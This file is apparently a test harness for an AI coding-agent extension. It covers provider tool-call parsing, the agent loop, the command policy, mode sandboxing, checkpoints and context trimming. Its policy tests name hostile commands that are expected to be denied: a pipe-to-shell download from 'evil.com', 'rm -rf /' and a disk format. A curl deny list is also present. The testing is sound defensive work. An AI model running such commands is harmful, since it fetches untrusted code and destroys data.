/* Standalone harness: exercises the vscode-free core against a mock LLM server. */
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
os.tmpdir = () => {
  const tmp = path.join(__dirname, 'tmp');
  if (!fs.existsSync(tmp)) {
    fs.mkdirSync(tmp, { recursive: true });
  }
  return tmp;
};
const Module = require('module');

// AgentToolExecutor and its tool modules require 'vscode', which only exists inside the
// extension host. Resolve it to a stub so the sandbox gate can be tested where it is
// actually enforced rather than only at the predicate.
const vscodeStub = {
  workspace: { workspaceFolders: [], findFiles: async () => [], asRelativePath: (p) => String(p), openTextDocument: async () => ({}) },
  window: { showInformationMessage: async () => undefined, showWarningMessage: async () => undefined, showErrorMessage: async () => undefined },
  languages: { getDiagnostics: () => [] },
  Uri: { file: (p) => ({ fsPath: p }), joinPath: (...p) => ({ fsPath: p.join('/') }) },
  Range: class {},
  Position: class {},
};
const origResolve = Module._resolveFilename;
Module._resolveFilename = function (request, ...rest) {
  if (request === 'vscode') return 'vscode';
  return origResolve.call(this, request, ...rest);
};
require.cache['vscode'] = { id: 'vscode', filename: 'vscode', loaded: true, exports: vscodeStub };

const DIST = path.join(__dirname, '..', 'dist');
const { LLMClient } = require(path.join(DIST, 'core/llm-client.js'));
const { runAgentLoop } = require(path.join(DIST, 'agent/agent-loop.js'));
const { BASE_TOOLS, toolsForMode, isToolAllowedInMode, renderToolDocs } = require(path.join(DIST, 'core/tools.js'));
const { CommandPolicy } = require(path.join(DIST, 'core/command-policy.js'));
const { CheckpointManager } = require(path.join(DIST, 'core/checkpoint-manager.js'));
const { ContextManager } = require(path.join(DIST, 'core/context-manager.js'));
const { PromptBuilder } = require(path.join(DIST, 'core/prompt-builder.js'));
const { EventBus } = require(path.join(DIST, 'core/event-bus.js'));
const { SessionManager } = require(path.join(DIST, 'core/session-manager.js'));
const { diffLines, applyHunks } = require(path.join(DIST, 'core/diff.js'));

let pass = 0, fail = 0;
function ok(name, cond, extra) { if (cond) { pass++; console.log('  ✓', name); } else { fail++; console.log('  ✗', name, extra !== undefined ? JSON.stringify(extra) : ''); } }

const sse = (lines) => lines.map(l => `data: ${typeof l === 'string' ? l : JSON.stringify(l)}\n\n`).join('');

// ─── Mock provider responses ────────────────────────────────────────────────
const openaiToolTurn = sse([
  { choices: [{ delta: { role: 'assistant', content: 'Let me read it.' } }] },
  { choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_1', function: { name: 'read_file', arguments: '' } }] } }] },
  { choices: [{ delta: { tool_calls: [{ index: 0, function: { arguments: '{"path":"a.txt"}' } }] } }] },
  { choices: [{ delta: {}, finish_reason: 'tool_calls' }] },
  '[DONE]',
]);
const openaiFinalTurn = sse([
  { choices: [{ delta: { content: 'All done.' } }] },
  { choices: [{ delta: {}, finish_reason: 'stop' }] },
  '[DONE]',
]);
const claudeToolTurn = sse([
  { type: 'message_start', message: {} },
  { type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } },
  { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'Reading now.' } },
  { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'toolu_1', name: 'read_file' } },
  { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: '{"path":"a.txt"}' } },
  { type: 'message_stop' },
]);
const geminiToolTurn = JSON.stringify([
  { candidates: [{ content: { parts: [{ text: 'Reading.' }, { functionCall: { name: 'read_file', args: { path: 'a.txt' } } }] } }] },
]);
const localToolTurn = sse([
  { choices: [{ delta: { content: '```json\n{"action":"read_file","path":"a.txt"}\n```' } }] },
  '[DONE]',
]);

let openaiLoopCall = 0;
const server = http.createServer((req, res) => {
  let body = '';
  req.on('data', c => body += c);
  req.on('end', () => {
    res.setHeader('Content-Type', 'text/event-stream');
    const url = req.url;
    if (url === '/openai') { res.end(openaiToolTurn); }
    else if (url === '/openai-loop') { res.end(openaiLoopCall++ === 0 ? openaiToolTurn : openaiFinalTurn); }
    else if (url === '/claude') { res.end(claudeToolTurn); }
    else if (url === '/gemini') { res.setHeader('Content-Type', 'application/json'); res.end(geminiToolTurn); }
    else if (url === '/local/v1/chat/completions') { res.end(localToolTurn); }
    else { res.statusCode = 404; res.end('nope'); }
  });
});

async function main() {
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  const base = `http://127.0.0.1:${port}`;
  const req = { system: 'sys', messages: [{ role: 'user', content: 'read a.txt' }], tools: BASE_TOOLS };

  console.log('\n[1] Native tool-call parsing per provider');
  {
    let text = '';
    const r = await LLMClient.streamAgentTurn({ type: 'openai', url: `${base}/openai`, apiKey: 'x', model: 'gpt-4o' }, req, t => text += t);
    ok('openai streams text', text === 'Let me read it.', text);
    ok('openai parses tool call', r.toolCalls.length === 1 && r.toolCalls[0].name === 'read_file' && r.toolCalls[0].arguments.path === 'a.txt', r.toolCalls);
  }
  {
    let text = '';
    const r = await LLMClient.streamAgentTurn({ type: 'claude', url: `${base}/claude`, apiKey: 'x', model: 'claude-3-5-sonnet' }, req, t => text += t);
    ok('claude streams text', text === 'Reading now.', text);
    ok('claude parses tool_use', r.toolCalls.length === 1 && r.toolCalls[0].name === 'read_file' && r.toolCalls[0].arguments.path === 'a.txt', r.toolCalls);
  }
  {
    let text = '';
    const r = await LLMClient.streamAgentTurn({ type: 'google', url: `${base}/gemini`, apiKey: 'x', model: 'gemini-2.5-flash' }, req, t => text += t);
    ok('gemini parses text', r.text === 'Reading.', r.text);
    ok('gemini parses functionCall', r.toolCalls.length === 1 && r.toolCalls[0].name === 'read_file' && r.toolCalls[0].arguments.path === 'a.txt', r.toolCalls);
  }
  {
    let text = '';
    const r = await LLMClient.streamAgentTurn({ type: 'local', url: `${base}/local/v1/chat/completions`, model: 'llama3' }, req, t => text += t);
    ok('local fallback parses text-JSON tool call', r.toolCalls.length === 1 && r.toolCalls[0].name === 'read_file' && r.toolCalls[0].arguments.path === 'a.txt', r.toolCalls);
  }

  console.log('\n[2] Full agent loop (tool call -> result -> completion)');
  {
    const executed = [];
    const stubExecutor = { execute: async (tc) => { executed.push(tc.name); return { id: tc.id, name: tc.name, content: 'file contents here' }; } };
    const result = await runAgentLoop({
      modelConfig: { type: 'openai', url: `${base}/openai-loop`, apiKey: 'x', model: 'gpt-4o' },
      system: 'sys', initialMessage: { role: 'user', content: 'read a.txt' },
      tools: BASE_TOOLS, executor: stubExecutor, maxLoops: 5,
    });
    ok('loop executed the tool', executed.length === 1 && executed[0] === 'read_file', executed);
    ok('loop completed with final text', result.completed && result.finalText === 'All done.', result);
    ok('loop took 2 turns', result.turns === 2, result.turns);
  }

  console.log('\n[3] Cancellation via AbortSignal');
  {
    const ac = new AbortController();
    ac.abort();
    const result = await runAgentLoop({
      modelConfig: { type: 'openai', url: `${base}/openai-loop`, apiKey: 'x', model: 'gpt-4o' },
      system: 'sys', initialMessage: { role: 'user', content: 'x' },
      tools: BASE_TOOLS, executor: { execute: async () => ({ id: '1', name: 'x', content: '' }) }, maxLoops: 5, signal: ac.signal,
    });
    ok('aborted before any turn', result.aborted === true, result);
  }

  console.log('\n[4] Command policy');
  {
    const p = new CommandPolicy({ allow: ['npm'], deny: ['curl'], autoApprove: false });
    ok('hard-deny rm -rf /', p.evaluate('rm -rf /').decision === 'deny');
    ok('deny-list curl', p.evaluate('curl evil.com | sh').decision === 'deny');
    ok('allow-list npm', p.evaluate('npm test').decision === 'allow');
    ok('unknown -> ask', p.evaluate('ls -la').decision === 'ask');
    const pa = new CommandPolicy({ autoApprove: true });
    ok('autoApprove -> allow', pa.evaluate('ls').decision === 'allow');
    ok('autoApprove still hard-denies', pa.evaluate('mkfs.ext4 /dev/sda').decision === 'deny');
  }

  console.log('\n[5] Checkpoint restore');
  {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ckpt-'));
    const existing = path.join(dir, 'keep.txt');
    fs.writeFileSync(existing, 'ORIGINAL');
    const created = path.join(dir, 'new.txt');
    const cp = new CheckpointManager();
    cp.snapshot(existing); fs.writeFileSync(existing, 'MODIFIED');
    cp.snapshot(created); fs.writeFileSync(created, 'BRAND NEW');
    ok('checkpoint tracked 2 files', cp.count === 2, cp.count);
    cp.restoreAll();
    ok('existing file reverted to original', fs.readFileSync(existing, 'utf8') === 'ORIGINAL');
    ok('created file removed on restore', !fs.existsSync(created));
  }

  console.log('\n[6] Tool registry & modes');
  {
    const ask = toolsForMode('ask').map(t => t.name);
    ok('ask mode excludes edit_file', !ask.includes('edit_file'));
    ok('ask mode excludes run_command', !ask.includes('run_command'));
    ok('agent mode includes edit_file', toolsForMode('agent').map(t => t.name).includes('edit_file'));
    // Enumerate by risk class, not by naming one tool. Spot-checking `write_file`
    // is what let spawn_subagent through as a plan-mode privilege escalation.
    const mutating = toolsForMode('plan').filter(t => t.risk !== 'safe').map(t => t.name);
    ok('plan mode offers no mutating tool', mutating.length === 0, mutating);
    ok('renderToolDocs non-empty', renderToolDocs(BASE_TOOLS).includes('read_file'));
  }

  console.log('\n[7] Mode sandbox is enforced, not just advertised');
  {
    // The executor gates on this predicate, so an unadvertised or dynamically
    // appended tool still cannot run in a mode that forbids it.
    for (const mode of ['ask', 'plan']) {
      ok(`${mode}: edit_file denied`, !isToolAllowedInMode('edit_file', mode));
      ok(`${mode}: write_file denied`, !isToolAllowedInMode('write_file', mode));
      ok(`${mode}: run_command denied`, !isToolAllowedInMode('run_command', mode));
      // MCP tools are discovered at runtime and never appear in BASE_TOOLS.
      ok(`${mode}: unknown mcp_* tool denied`, !isToolAllowedInMode('mcp_anything', mode));
      ok(`${mode}: mcp_call denied`, !isToolAllowedInMode('mcp_call', mode));
    }
    ok('agent: edit_file allowed', isToolAllowedInMode('edit_file', 'agent'));
    ok('agent: dynamic mcp_* tool allowed', isToolAllowedInMode('mcp_foo', 'agent'));
    ok('unknown tool denied even in agent mode', !isToolAllowedInMode('rm_rf_slash', 'agent'));

    // Delegation must not outrank its parent: a plan-mode subagent gets plan-mode
    // tools. Regression for spawn_subagent/schedule_task hardcoding agent mode.
    const planDelegate = toolsForMode('plan').filter(t => t.risk !== 'safe');
    ok('plan-mode delegate inherits a read-only tool set', planDelegate.length === 0, planDelegate);
  }

  console.log('\n[7b] Executor refuses forbidden tools before any side effect');
  {
    const { AgentToolExecutor } = require(path.join(DIST, 'agent/tool-executor.js'));
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sandbox-'));
    const target = path.join(dir, 'victim.txt');
    fs.writeFileSync(target, 'ORIGINAL');

    const mkExec = (mode, onApprove) => {
      const calls = { approve: 0, mcp: 0 };
      const deps = {
        mode, rootPath: dir,
        log: () => {},
        approve: async () => { calls.approve++; return onApprove !== undefined ? onApprove : true; },
        mcpClient: { callTool: async () => { calls.mcp++; return 'mcp ran'; } },
        checkpoint: { snapshot: () => {} },
        browserTool: {}, artifactManager: {}, knowledgeStore: {}, codebaseIndex: {},
        spawnSubagent: async () => 'sub done',
      };
      return { exec: new AgentToolExecutor(deps), calls };
    };

    // A read-only mode must refuse a mutating tool *before* prompting or touching disk.
    for (const mode of ['ask', 'plan']) {
      const { exec, calls } = mkExec(mode);
      const r1 = await exec.execute({ id: '1', name: 'run_command', arguments: { command: `echo pwned > ${target}` } });
      ok(`${mode}: executor refuses run_command`, r1.isError === true, r1.content);
      const r2 = await exec.execute({ id: '2', name: 'write_file', arguments: { path: 'victim.txt', content: 'PWNED' } });
      ok(`${mode}: executor refuses write_file`, r2.isError === true, r2.content);
      const r3 = await exec.execute({ id: '3', name: 'mcp_evil', arguments: {} });
      ok(`${mode}: executor refuses dynamic mcp_* tool`, r3.isError === true, r3.content);
      ok(`${mode}: never reached the approval prompt`, calls.approve === 0, calls.approve);
      ok(`${mode}: never reached the MCP server`, calls.mcp === 0, calls.mcp);
    }
    ok('refused tools left the file untouched', fs.readFileSync(target, 'utf8') === 'ORIGINAL');

    // Agent mode must still reach the approval layer — the gate opens, it does not
    // replace the permission prompt.
    {
      const { exec, calls } = mkExec('agent', false);
      const r = await exec.execute({ id: '4', name: 'run_command', arguments: { command: 'echo hi' } });
      ok('agent: run_command reaches the approval prompt', calls.approve === 1, calls.approve);
      ok('agent: rejected command does not execute', /rejected/i.test(r.content), r.content);
    }
    {
      const { exec, calls } = mkExec('agent', true);
      const r = await exec.execute({ id: '5', name: 'mcp_search', arguments: { q: 'x' } });
      ok('agent: mcp_* tool dispatches to the server', calls.mcp === 1 && /mcp ran/.test(r.content), r.content);
      ok('agent: mcp_* tool is not "Unknown tool"', !/Unknown tool/.test(r.content), r.content);
    }
  }

  console.log('\n[8] Context window is bounded by tokens, and never orphans a tool result');
  {
    // The loop's real message shape: an assistant tool_call, then its tool_result.
    const build = (turns, resultSize = 20) => {
      const m = [{ role: 'user', content: 'task' }];
      for (let t = 0; t < turns; t++) {
        m.push({ role: 'assistant', content: '', toolCalls: [{ id: 'c' + t, name: 'read_file', arguments: {} }] });
        m.push({ role: 'user', content: '', toolResults: [{ id: 'c' + t, name: 'read_file', content: 'x'.repeat(resultSize) }] });
      }
      return m;
    };
    const orphans = (kept) => {
      const seen = new Set();
      let bad = 0;
      for (const msg of kept) {
        for (const tc of msg.toolCalls || []) seen.add(tc.id);
        for (const tr of msg.toolResults || []) if (!seen.has(tr.id)) bad++;
      }
      return bad;
    };

    // Sweep budgets and payload sizes: the pairing invariant must hold at every cut.
    let orphaned = 0, overBudget = 0;
    for (const limit of [6000, 8000, 12000, 40000]) {
      const cm = new ContextManager(limit);
      for (let turns = 1; turns <= 30; turns++) {
        for (const size of [50, 2000, 30000]) {
          const r = cm.fit(build(turns, size), 'system prompt');
          orphaned += orphans(r.messages);
          // 4096 is reserved for the response; allow the head message to exceed on its own.
          if (r.totalTokens > limit) overBudget++;
        }
      }
    }
    ok('no orphaned tool results at any budget', orphaned === 0, orphaned);
    ok('fitted conversation stays within the window', overBudget === 0, overBudget);

    const cm = new ContextManager(8000);
    const fitted = cm.fit(build(30, 4000), 'sys');
    ok('over-long conversation is actually compacted', fitted.droppedCount > 0, fitted.droppedCount);
    ok('the original task survives compaction', fitted.messages[0].content.startsWith('task'));
    ok('dropped turns are summarized into the task', /compacted/.test(fitted.messages[0].content));

    // Count-based trimming could not do this: 24 huge reads still overflow the window.
    const huge = new ContextManager(8000).fit(build(24, 200000), 'sys');
    ok('a single huge tool result is capped, not passed through', huge.totalTokens < 8000, huge.totalTokens);

    const small = new ContextManager(128000).fit(build(2, 50), 'sys');
    ok('short conversations pass through untouched', small.droppedCount === 0 && small.messages.length === 5);
  }

  console.log('\n[9] Diff / patch engine');
  {
    const before = ['a', 'b', 'c', 'd', 'e'].join('\n');
    const after = ['a', 'B2', 'c', 'd', 'e', 'f'].join('\n');
    const fwd = diffLines(before, after);
    const rev = diffLines(after, before);
    ok('forward patch reproduces after', applyHunks(before, fwd).content === after);
    ok('reverse patch reproduces before', applyHunks(after, rev).content === before);
    ok('empty diff for identical content', diffLines(before, before).length === 0);
    ok('diff from empty is a pure insertion', applyHunks('', diffLines('', after)).content === after);

    // The property that justifies patches over snapshots: the reverse patch still lands
    // after an UNRELATED later edit, and that later edit survives the undo.
    const drifted = ['HEADER', 'a', 'B2', 'c', 'd', 'e', 'f', 'FOOTER'].join('\n');
    const undone = applyHunks(drifted, rev);
    ok('reverse patch applies through drift', undone.ok, undone.conflicts);
    ok('undo preserves the unrelated later edit', undone.content === ['HEADER', 'a', 'b', 'c', 'd', 'e', 'FOOTER'].join('\n'), undone.content);

    // When the region the patch targets is gone, refuse rather than guess.
    const clobbered = ['totally', 'different', 'file'].join('\n');
    ok('unlocatable hunk is reported as a conflict', !applyHunks(clobbered, rev).ok);
  }

  console.log('\n[10] Transactional checkpoints: undo, redo, per-file review');
  {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'txn-'));
    const store = fs.mkdtempSync(path.join(os.tmpdir(), 'store-'));
    const edited = path.join(dir, 'edited.txt');
    const created = path.join(dir, 'created.txt');
    fs.writeFileSync(edited, 'line1\nline2\nline3');

    const cp = new CheckpointManager(store);
    cp.snapshot(edited); fs.writeFileSync(edited, 'line1\nLINE2-CHANGED\nline3');
    cp.snapshot(created); fs.writeFileSync(created, 'brand new');
    const txn = cp.commit('task_1', 'Refactor', dir);

    ok('transaction records both files', txn.files.length === 2, txn.files.map(f => f.relPath));
    ok('created file is classified as created', txn.files.find(f => f.relPath === 'created.txt').kind === 'created');
    ok('edited file is classified as modified', txn.files.find(f => f.relPath === 'edited.txt').kind === 'modified');
    ok('diff stats are recorded', txn.files.find(f => f.relPath === 'edited.txt').linesAdded === 1);

    // THE case that whole-file snapshots get wrong: the user edits the same file
    // afterwards, then undoes the agent's task. Their edit must survive.
    fs.writeFileSync(edited, 'line1\nLINE2-CHANGED\nline3\nUSER-ADDED-THIS');
    const undo = cp.undo(txn.id);
    ok('undo restored both files', undo.restored.length === 2 && undo.conflicted.length === 0, undo);
    ok("undo reverted only the agent's change", fs.readFileSync(edited, 'utf8') === 'line1\nline2\nline3\nUSER-ADDED-THIS', fs.readFileSync(edited, 'utf8'));
    ok('undo deleted the created file', !fs.existsSync(created));

    const redo = cp.redo(txn.id);
    ok('redo re-applied the edit', /LINE2-CHANGED/.test(fs.readFileSync(edited, 'utf8')) && redo.conflicted.length === 0, redo);
    ok('redo preserved the later user edit too', /USER-ADDED-THIS/.test(fs.readFileSync(edited, 'utf8')));
    ok('redo re-created the created file', fs.existsSync(created) && fs.readFileSync(created, 'utf8') === 'brand new');

    // Per-file review: keep one, restore the other.
    const cp2 = new CheckpointManager(store);
    const a = path.join(dir, 'a.txt'), b = path.join(dir, 'b.txt');
    fs.writeFileSync(a, 'A0'); fs.writeFileSync(b, 'B0');
    cp2.snapshot(a); fs.writeFileSync(a, 'A1');
    cp2.snapshot(b); fs.writeFileSync(b, 'B1');
    const t2 = cp2.commit('task_2', 'Two files', dir);
    cp2.keepFile(t2.id, a);
    cp2.restoreFile(t2.id, b);
    ok('kept file stays modified', fs.readFileSync(a, 'utf8') === 'A1');
    ok('restored file is reverted', fs.readFileSync(b, 'utf8') === 'B0');
    ok('review states are tracked', t2.files.find(f => f.path === a).reviewState === 'kept' && t2.files.find(f => f.path === b).reviewState === 'restored');

    // Persistence: a fresh manager over the same storage sees prior checkpoints.
    const reloaded = new CheckpointManager(store);
    ok('checkpoints survive a reload', reloaded.list().length >= 2, reloaded.list().length);
    ok('reloaded checkpoint keeps its patches', reloaded.list().every(c => c.files.every(f => Array.isArray(f.reverse))));

    // A file the agent read but did not change must not show up for review.
    const cp3 = new CheckpointManager();
    const untouched = path.join(dir, 'untouched.txt');
    fs.writeFileSync(untouched, 'same');
    cp3.snapshot(untouched);
    ok('unchanged file produces no transaction', cp3.commit('task_3', 'noop', dir) === undefined);
  }

  console.log('\n[11] Event bus & session identity');
  {
    const bus = new EventBus();
    const sessions = new SessionManager(bus);
    const seen = [];
    bus.onAny(e => seen.push(e));

    const task = sessions.beginTask('do a thing', 'agent', 'gpt-4o');
    task.emit({ type: 'TurnStarted', turn: 1 });
    task.emit({ type: 'ToolStarted', toolCallId: 't1', name: 'read_file', summary: 'a.txt' });
    task.emit({ type: 'ToolFinished', toolCallId: 't1', name: 'read_file', ok: true, durationMs: 5, summary: 'ok' });
    task.emit({ type: 'TaskCompleted', finalText: 'done', turns: 1, durationMs: 100 });

    ok('every event carries correlation ids', seen.every(e => e.sessionId && e.conversationId && e.taskId && e.traceId && e.ts), seen[0]);
    ok('TaskStarted is emitted on begin', seen[0].type === 'TaskStarted');
    ok('all events share one traceId', new Set(seen.map(e => e.traceId)).size === 1);

    const record = sessions.getTask(task.meta.taskId);
    ok('task record projects to completed', record.state === 'completed', record.state);
    ok('task record captured turn count', record.turns === 1);
    ok('no task is active after completion', sessions.activeTask === undefined);

    // A late event must not resurrect a finished task.
    task.emit({ type: 'TurnStarted', turn: 9 });
    ok('terminal state is final', sessions.getTask(task.meta.taskId).state === 'completed');

    // Typed subscription only receives its own type.
    let toolCount = 0;
    bus.on('ToolStarted', () => toolCount++);
    const t2 = sessions.beginTask('another', 'ask', 'gpt-4o');
    t2.emit({ type: 'ToolStarted', toolCallId: 'x', name: 'grep_search', summary: '' });
    t2.emit({ type: 'TurnStarted', turn: 1 });
    ok('typed subscription is filtered', toolCount === 1, toolCount);

    // A throwing subscriber must not take down the run that published the event.
    bus.on('Log', () => { throw new Error('subscriber blew up'); });
    let survived = true;
    try { t2.emit({ type: 'Log', level: 'info', message: 'hi' }); } catch { survived = false; }
    ok('a throwing subscriber cannot break the publisher', survived);

    ok('tasks are grouped by conversation', sessions.tasksFor(sessions.currentConversationId).length === 2);
  }

  console.log('\n[12] Prompt builder budgets');
  {
    const big = 'x'.repeat(40000); // ~10k tokens
    const built = new PromptBuilder()
      .add({ name: 'system', content: 'You are the agent.', budgetTokens: 1000, required: true })
      .add({ name: 'rules', content: big, budgetTokens: 500 })
      .add({ name: 'knowledge', content: big, budgetTokens: 500 })
      .build(2000);

    ok('oversized section is truncated to its own budget', built.sections.find(s => s.name === 'rules').tokens <= 500);
    ok('truncation is reported', built.sections.find(s => s.name === 'rules').truncated === true);
    ok('total respects the overall budget', built.totalTokens <= 2000, built.totalTokens);
    ok('system instructions are present', built.text.includes('You are the agent.'));

    // A greedy section must never be able to evict the system prompt.
    const tight = new PromptBuilder()
      .add({ name: 'system', content: 'CRITICAL INSTRUCTIONS', budgetTokens: 1000, required: true })
      .add({ name: 'noise', content: big, budgetTokens: 5000 })
      .build(100);
    ok('required section survives an impossible budget', tight.text.includes('CRITICAL INSTRUCTIONS'));
    ok('optional section is dropped to make room', tight.sections.find(s => s.name === 'noise').dropped === true);
    ok('empty sections are skipped entirely', new PromptBuilder().add({ name: 'e', content: '  ', budgetTokens: 10 }).build(100).text === '');
  }

  console.log('\n[13] Activity timeline is a projection of the event stream');
  {
    // The reducer is pure, so the UI can be tested without rendering it — and the
    // same events replayed in the same order always rebuild the same screen.
    const { agentReducer, initialAgentState, phaseLabel, elapsedMs, pendingReview } =
      require(path.join(__dirname, 'dist-store', 'agent-store.js'));

    const events = [
      { type: 'TaskStarted', taskId: 'task_1', traceId: 'tr_1', mode: 'agent', model: 'gpt-4o', prompt: 'go', ts: 1000 },
      { type: 'TurnStarted', turn: 1, ts: 1100 },
      { type: 'ToolStarted', toolCallId: 'c1', name: 'read_file', summary: 'a.ts', ts: 1200 },
      { type: 'ToolFinished', toolCallId: 'c1', name: 'read_file', ok: true, durationMs: 40, summary: 'ok', ts: 1240 },
      { type: 'ToolStarted', toolCallId: 'c2', name: 'run_command', summary: 'npm test', ts: 1300 },
      { type: 'TerminalChunk', stream: 'stdout', text: 'PASS\n', ts: 1350 },
      { type: 'TerminalChunk', stream: 'stderr', text: 'warn\n', ts: 1360 },
      { type: 'ToolFinished', toolCallId: 'c2', name: 'run_command', ok: false, durationMs: 900, summary: 'exit 1', ts: 1400 },
      { type: 'TaskCompleted', finalText: 'done', turns: 1, durationMs: 500, ts: 1500 },
    ];
    const final = events.reduce(agentReducer, initialAgentState);

    ok('timeline records every tool', final.activity.length === 2, final.activity.length);
    ok('successful tool is marked ok', final.activity[0].status === 'ok');
    ok('failed tool is marked error', final.activity[1].status === 'error');
    ok('tool durations are captured', final.activity[1].durationMs === 900);
    ok('terminal chunks are captured in order', final.terminal.map(c => c.text).join('') === 'PASS\nwarn\n');
    ok('stderr is distinguished from stdout', final.terminal[1].stream === 'stderr');
    ok('task ends completed', final.phase === 'completed' && phaseLabel(final) === 'Completed');
    ok('elapsed is frozen once the task ends', elapsedMs(final, 999999) === 500, elapsedMs(final, 999999));
    ok('correlation ids are projected', final.taskId === 'task_1' && final.traceId === 'tr_1');

    // Replay determinism: same events, same state.
    const replayed = events.reduce(agentReducer, initialAgentState);
    ok('replay is deterministic', JSON.stringify(replayed) === JSON.stringify(final));

    // A new task clears the run surfaces but must NOT discard checkpoints.
    const withCkpt = agentReducer(final, { type: 'checkpoints', value: [
      { id: 'cp1', messageId: 'task_1', label: 'x', createdAt: 1, files: [
        { path: '/a', relPath: 'a.ts', kind: 'modified', stat: '+1 -0', reviewState: 'pending' },
        { path: '/b', relPath: 'b.ts', kind: 'created', stat: '+9 -0', reviewState: 'kept' },
      ] },
    ] });
    ok('pending review lists only undecided files', pendingReview(withCkpt).length === 1, pendingReview(withCkpt).length);

    const next = agentReducer(withCkpt, { type: 'TaskStarted', taskId: 't2', traceId: 'tr2', mode: 'ask', model: 'm', prompt: 'p', ts: 2000 });
    ok('a new task clears the activity timeline', next.activity.length === 0);
    ok('a new task clears terminal output', next.terminal.length === 0);
    ok('checkpoints survive a new task', next.checkpoints.length === 1);
  }

  server.close();
  console.log(`\n──────────\nPASS ${pass}  FAIL ${fail}`);
  process.exit(fail ? 1 : 0);
}
main().catch(e => { console.error(e); process.exit(1); });
